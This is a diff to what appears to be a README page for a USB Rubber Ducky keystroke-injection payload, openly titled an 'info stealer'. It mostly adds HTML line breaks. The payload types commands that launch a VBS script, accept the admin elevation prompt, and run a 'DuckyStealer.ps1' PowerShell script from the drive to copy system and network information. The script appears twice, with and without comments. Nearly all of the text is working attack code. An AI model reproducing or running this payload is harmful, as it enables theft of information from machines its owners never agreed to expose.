@@ -10,30 +10,55 @@ REM gathernetworkInfo a info stealer script by JonnyBanana
 REM https://github.com/JonnyBanana
 </BR>
 REM large delay beacause Windows require a lot of time to read the Ducky with twin duck firmware
+</BR>
 DELAY 10000
-GUI r
+</BR>
+GUI R
+</BR>
 DELAY 200
+</BR>
 STRING cmd  /C "start gatherNetworkInfo.vbs"  
+</BR>
 DELAY 200
+</BR>
 REM run as admin
-CTRL ALT ENTER
+</BR>
+CTRL-ALT ENTER
+</BR>
 DELAY 100
+</BR>
 LEFTARROW
+</BR>
 DELAY 100
+</BR>
 ENTER
+</BR>
 REM the scripts require a little of time to create the files....
+</BR>
 DELAY 15000
+</BR>
 CTRL ESC
+</BR>
 DELAY 200
+</BR>
 STRING powershell
+</BR>
 DELAY 200
+</BR>
 ENTER
+</BR>
 DELAY 200
+</BR>
 REM the Rubber Ducky MUST renamed on " _ " (bottom bar)
+</BR>
 STRING .((gwmi win32_volume -f 'label=''_''').Name+'DuckyStealer.ps1')
+</BR>
 DELAY 200
+</BR>
 ENTER
+</BR>
 REM the last command  takes about thirty seconds to copy all the informations
+</BR>
 REM so be patient...
 
 
@@ -41,22 +66,42 @@ REM so be patient...
 <h6>Script Without Comments</H6>
 
 DELAY 10000
+</BR>
 GUI R
+</BR>
 DELAY 200
+</BR>
 STRING cmd  /C "start gatherNetworkInfo.vbs"  
+</BR>
 DELAY 200
+</BR>
 CTRL-ALT ENTER
+</BR>
 DELAY 100
+</BR>
 LEFTARROW
+</BR>
 DELAY 100
+</BR>
 ENTER
+</BR>
 DELAY 15000
+</BR>
 CTRL ESC
+</BR>
 DELAY 200
+</BR>
 STRING powershell
+</BR>
 DELAY 200
+</BR>
 ENTER
+</BR>
 DELAY 200
+</BR>
 STRING .((gwmi win32_volume -f 'label=''_''').Name+'DuckyStealer.ps1')
+</BR>
 DELAY 200
+</BR>
 ENTER
+</BR>
